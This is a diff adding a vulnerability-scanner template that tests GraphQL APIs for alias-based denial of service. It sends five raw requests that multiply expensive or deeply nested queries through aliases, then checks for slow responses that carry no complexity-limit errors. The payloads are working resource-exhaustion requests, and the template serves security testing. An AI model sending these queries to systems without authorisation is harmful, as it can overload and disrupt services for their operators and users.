@@ -1,0 +1,122 @@
+id: medium-api-graphql-alias-based-dos-attack
+
+info:
+  name: GraphQL Alias-Based DoS Attack
+  author: redteam-elite
+  severity: medium
+  description: |
+    Detects GraphQL alias-based DoS vulnerabilities where attackers can create
+    multiple aliases for the same expensive query, bypassing query complexity
+    analysis and overwhelming server resources through alias multiplication.
+  reference:
+    - https://graphql.org/learn/queries/#aliases
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cwe-id: CWE-400
+  tags: graphql,alias,dos,denial-of-service,query-complexity,api,medium
+
+http:
+  - raw:
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"{ alias1: users { id name email } alias2: users { id name email } alias3: users { id name email } alias4: users { id name email } alias5: users { id name email } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"{ a1: user(id: \"1\") { posts { comments { replies { author { profile { friends { posts { id } } } } } } } a2: user(id: \"1\") { posts { comments { replies { author { profile { friends { posts { id } } } } } } } a3: user(id: \"1\") { posts { comments { replies { author { profile { friends { posts { id } } } } } } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"{ load1: search(query: \"test\") { results { id title content author { posts { comments { id } } } } } load2: search(query: \"test\") { results { id title content author { posts { comments { id } } } } } load3: search(query: \"test\") { results { id title content author { posts { comments { id } } } } } load4: search(query: \"test\") { results { id title content author { posts { comments { id } } } } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"{ heavy1: analytics { userStats { dailyActive monthlyActive yearlyActive } } heavy2: analytics { userStats { dailyActive monthlyActive yearlyActive } } heavy3: analytics { userStats { dailyActive monthlyActive yearlyActive } } heavy4: analytics { userStats { dailyActive monthlyActive yearlyActive } } heavy5: analytics { userStats { dailyActive monthlyActive yearlyActive } } heavy6: analytics { userStats { dailyActive monthlyActive yearlyActive } } }"}
+
+      - |
+        POST /graphql HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+        {"query":"{ batch1: products { id name price reviews { rating comment author { profile { avatar bio } } } } batch2: products { id name price reviews { rating comment author { profile { avatar bio } } } } batch3: products { id name price reviews { rating comment author { profile { avatar bio } } } } batch4: products { id name price reviews { rating comment author { profile { avatar bio } } } } batch5: products { id name price reviews { rating comment author { profile { avatar bio } } } } }"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: regex
+        part: body
+        regex:
+          - '"data":\s*\{'
+          - '"alias1":\s*\['
+          - '"alias2":\s*\['
+          - '"alias3":\s*\['
+          - '"a1":\s*\{'
+          - '"a2":\s*\{'
+          - '"a3":\s*\{'
+          - '"load1":\s*\{'
+          - '"load2":\s*\{'
+          - '"heavy1":\s*\{'
+          - '"heavy2":\s*\{'
+          - '"batch1":\s*\['
+          - '"batch2":\s*\['
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - '"users":\s*\['
+          - '"posts":\s*\['
+          - '"comments":\s*\['
+          - '"results":\s*\['
+          - '"userStats":\s*\{'
+          - '"products":\s*\['
+          - '"reviews":\s*\['
+        condition: or
+
+      - type: regex
+        part: body
+        negative: true
+        regex:
+          - '"errors":\s*\['
+          - '"error":\s*"query.*too.*complex"'
+          - '"error":\s*"alias.*limit.*exceeded"'
+          - '"error":\s*"query.*depth.*exceeded"'
+          - 'alias.*not.*allowed'
+          - 'complexity.*limit.*reached'
+
+      - type: word
+        part: header
+        negative: true
+        words:
+          - "X-GraphQL-Alias-Limit: exceeded"
+          - "X-Query-Complexity-Limit: exceeded"
+
+      - type: dsl
+        dsl:
+          - 'duration >= 2000'
+        condition: or
+
+    stop-at-first-match: true
